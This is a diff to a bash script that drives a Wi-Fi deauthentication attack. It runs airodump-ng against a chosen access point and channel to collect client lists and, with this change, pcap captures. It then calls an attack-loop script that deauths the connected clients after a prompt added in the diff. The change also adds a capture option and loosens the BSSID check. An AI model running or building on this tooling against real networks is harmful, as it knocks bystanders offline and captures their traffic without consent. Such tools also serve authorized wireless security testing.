@@ -11,10 +11,12 @@ tdef=$(tput sgr0)
 bssid="null"
 ch="null"
 iface="null"
+capture="false"
 
 declare -a clients
 
 cl_list="clients-01.csv"
+clcap_list="clients-01.cap"
 
 macrgx="^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$"
 
@@ -29,12 +31,16 @@ get_input () {
 
 start () {
     [ -e "$cl_list" ] && rm -f "$cl_list"
+    [ -e "$clcap_list" ] && rm -f "$clcap_list"
     
-    xterm -T "Client List" -fg white -bg black -e "airodump-ng ${iface} -d ${bssid} -a -c ${ch} -I 2 -w clients --output-format csv" &> /dev/null &
+    xterm -T "Client List" -fg white -bg black -geometry 90x40-50+50 -e "airodump-ng ${iface} -d ${bssid} -a -c ${ch} -I 2 -w clients -o csv -o pcap" &> /dev/null &
     c_air_pid=$!
 
     "$SCRIPT_DIR"/deauth/client-loop.sh $bssid &
     c_cloop_pid=$!
+
+    read -p "Press Return to start deauthing clients. "
+    printf "\n"
 
     "$SCRIPT_DIR"/deauth/attack-loop.sh $iface $bssid  &
     c_aloop_pid=$!
@@ -66,12 +72,15 @@ main () {
         elif [ $1 = "--iface" ]
         then
             iface="$2"
+        elif [ $1 = "--capture" ]
+        then
+            capture="$2"
         fi
 
         shift
     done
 
-    if [ $bssid = "null" ]
+    if [[  $bssid = "null" || $bssid = "[null]" ]]
     then
         printf "BSSID not found.\n"
         exit 0
